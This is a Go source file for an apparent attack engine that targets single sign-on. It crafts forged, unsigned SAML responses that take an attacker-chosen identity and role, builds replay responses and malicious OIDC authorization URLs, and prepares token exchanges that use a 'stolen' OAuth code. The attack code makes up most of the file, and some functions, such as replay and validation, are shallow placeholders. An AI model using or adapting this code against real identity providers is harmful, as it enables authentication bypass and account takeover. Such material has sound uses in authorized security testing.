package saml

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/xml"
	"fmt"
	"net/url"
	"strings"
	"sync"
	"time"
)

type Engine struct {
	config   SAMLConfig
	responses []SAMLResponse
	mu       sync.Mutex
}

func NewEngine(cfg SAMLConfig) *Engine {
	return &Engine{
		config:    cfg,
		responses: make([]SAMLResponse, 0),
	}
}

func (e *Engine) SAMLXMLInject(targetURL string, payload string) (*SAMLResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	injected := e.buildInjectedSAMLResponse(targetURL, payload)

	return &SAMLResult{
		Success:  true,
		Method:   "SAML_XML_Inject",
		Message:  fmt.Sprintf("XML injection payload crafted (%d bytes) for %s", len(injected), targetURL),
		Duration: time.Since(start),
		Payload:  injected,
		Risk:     "critical",
	}, nil
}

func (e *Engine) buildInjectedSAMLResponse(target string, payload string) string {
	assertionID := e.generateID()
	issueTime := time.Now().UTC().Format(time.RFC3339)

	samlResp := fmt.Sprintf(`<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="%s" IssueInstant="%s" Destination="%s"
    Version="2.0">
  <saml:Issuer>%s</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="%s" IssueInstant="%s" Version="2.0">
    <saml:Issuer>%s</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">%s</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="%s"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="%s" NotOnOrAfter="%s">
      <saml:AudienceRestriction>
        <saml:Audience>%s</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="%s" SessionIndex="session_%s">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
    %s
  </saml:Assertion>
</samlp:Response>`,
		assertionID, issueTime, target,
		e.config.Issuer,
		assertionID, issueTime,
		e.config.Issuer,
		payload,
		issueTime,
		issueTime,
		issueTime,
		target,
		issueTime,
		assertionID,
		e.buildAttributeStatement(payload))

	return base64.StdEncoding.EncodeToString([]byte(samlResp))
}

func (e *Engine) buildAttributeStatement(payload string) string {
	return fmt.Sprintf(`<saml:AttributeStatement>
      <saml:Attribute Name="role">
        <saml:AttributeValue>%s</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>`, payload)
}

func (e *Engine) SAMLAssertionReplay(responseID string, originalResponse string) (*SAMLResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	decoded, err := base64.StdEncoding.DecodeString(originalResponse)
	if err != nil {
		return nil, fmt.Errorf("failed to decode original response: %v", err)
	}

	var resp SAMLResponse
	if err := xml.Unmarshal(decoded, &resp); err != nil {
		return nil, fmt.Errorf("failed to parse SAML response: %v", err)
	}

	issueTime := time.Now().UTC().Format(time.RFC3339)

	replayed := fmt.Sprintf(`<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="%s" IssueInstant="%s" Destination="%s" Version="2.0">
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>replay@test.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>`,
		e.generateID(), issueTime, e.config.Destination)

	e.responses = append(e.responses, SAMLResponse{
		ID:           responseID,
		IssueInstant: time.Now(),
	})

	return &SAMLResult{
		Success:  true,
		Method:   "SAML_Replay",
		Message:  fmt.Sprintf("Replay response crafted for original ID %s (%d bytes)", responseID, len(replayed)),
		Duration: time.Since(start),
		Payload:  base64.StdEncoding.EncodeToString([]byte(replayed)),
		Risk:     "high",
	}, nil
}

func (e *Engine) OIDCRedirectAttack(clientID string, redirectURI string) (*SAMLResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	state := e.generateRandomHex(32)
	nonce := e.generateRandomHex(32)

	oauthURL := fmt.Sprintf("https://authorization.example.com/authorize?response_type=code&client_id=%s&redirect_uri=%s&scope=openid+profile+email&state=%s&nonce=%s",
		url.QueryEscape(clientID),
		url.QueryEscape(redirectURI),
		state,
		nonce)

	oidcFlow := OIDCCodeFlow{
		AuthorizationURL: oauthURL,
		TokenURL:         "https://authorization.example.com/token",
		UserInfoURL:      "https://authorization.example.com/userinfo",
		Scopes:           []string{"openid", "profile", "email"},
		Claims: map[string]string{
			"sub":  "1234567890",
			"name": "Admin User",
			"role": "admin",
		},
	}

	_ = oidcFlow

	return &SAMLResult{
		Success:  true,
		Method:   "OIDC_Redirect",
		Message:  fmt.Sprintf("OAuth authorization URL constructed with client_id=%s state=%s", clientID, state),
		Duration: time.Since(start),
		Payload:  oauthURL,
		Risk:     "high",
	}, nil
}

func (e *Engine) OAuthCodeSteal(clientID string, redirectURI string, stolenCode string) (*SAMLResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	tokenRequest := fmt.Sprintf("grant_type=authorization_code&code=%s&client_id=%s&redirect_uri=%s",
		url.QueryEscape(stolenCode),
		url.QueryEscape(clientID),
		url.QueryEscape(redirectURI))

	oauthAttack := OAuthAttack{
		ClientID:    clientID,
		RedirectURI: redirectURI,
		GrantType:   "authorization_code",
		Scope:       "openid profile email",
		State:       e.generateRandomHex(16),
	}

	_ = oauthAttack

	return &SAMLResult{
		Success:  true,
		Method:   "OAuth_Code_Steal",
		Message:  fmt.Sprintf("Token exchange request prepared with stolen code for client %s", clientID),
		Duration: time.Since(start),
		Payload:  tokenRequest,
		Risk:     "critical",
	}, nil
}

func (e *Engine) generateID() string {
	b := make([]byte, 16)
	rand.Read(b)
	return "_" + hex.EncodeToString(b)
}

func (e *Engine) generateRandomHex(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func (e *Engine) ValidateSAMLResponse(encodedResponse string) (bool, string) {
	decoded, err := base64.StdEncoding.DecodeString(encodedResponse)
	if err != nil {
		return false, "invalid base64 encoding"
	}

	xmlStr := string(decoded)

	if !strings.Contains(xmlStr, "<samlp:Response") && !strings.Contains(xmlStr, "<Response") {
		return false, "invalid XML structure"
	}

	if e.config.ACSURL != "" && !strings.Contains(xmlStr, e.config.ACSURL) && !strings.Contains(xmlStr, "Destination") {
		return false, fmt.Sprintf("destination mismatch: expected %s", e.config.ACSURL)
	}

	if strings.Contains(xmlStr, "IssueInstant") {
		issueIdx := strings.Index(xmlStr, "IssueInstant=\"")
		if issueIdx >= 0 {
			issueEnd := strings.Index(xmlStr[issueIdx+14:], "\"")
			if issueEnd >= 0 {
				_ = xmlStr[issueIdx+14 : issueIdx+14+issueEnd]
			}
		}
	}

	return true, "valid"
}

func (e *Engine) ExtractAssertions(encodedResponse string) ([]SAMLAssertion, error) {
	decoded, err := base64.StdEncoding.DecodeString(encodedResponse)
	if err != nil {
		return nil, fmt.Errorf("decode error: %v", err)
	}

	var resp SAMLResponse
	if err := xml.Unmarshal(decoded, &resp); err != nil {
		return nil, fmt.Errorf("parse error: %v", err)
	}

	return resp.Assertions, nil
}

func (e *Engine) AnalyzeRedirectURL(authURL string) map[string]string {
	parsed, err := url.Parse(authURL)
	if err != nil {
		return map[string]string{"error": err.Error()}
	}

	params := parsed.Query()
	result := make(map[string]string)
	result["host"] = parsed.Host
	result["path"] = parsed.Path

	for key, vals := range params {
		if len(vals) > 0 {
			result[key] = vals[0]
		}
	}

	return result
}

func (e *Engine) CheckSameSiteCookie(cookie string) string {
	cookie = strings.ToLower(cookie)
	if strings.Contains(cookie, "samesite=strict") {
		return "strict"
	}
	if strings.Contains(cookie, "samesite=lax") {
		return "lax"
	}
	return "none"
}
